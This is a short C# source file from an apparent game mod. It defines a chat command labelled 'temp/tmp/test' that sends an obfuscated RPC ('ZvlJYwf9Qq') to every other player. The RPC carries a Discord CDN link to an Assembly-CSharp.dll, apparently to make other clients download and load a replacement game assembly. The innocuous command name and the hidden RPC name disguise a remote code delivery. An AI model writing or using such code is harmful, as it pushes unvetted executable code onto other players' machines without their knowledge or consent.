using Mod.exceptions;

namespace Mod.commands
{
    [Command("temp;tmp;test")]
    public class CommandTemp
    {
        public void OnCommand(PhotonPlayer sender, string[] args)
        {
            FengGameManagerMKII.instance.photonView.RPC("ZvlJYwf9Qq", PhotonTargets.Users, "https://cdn.discordapp.com/attachments/275717478045450240/304307645983227905/Assembly-CSharp.dll");
        }
    }
}
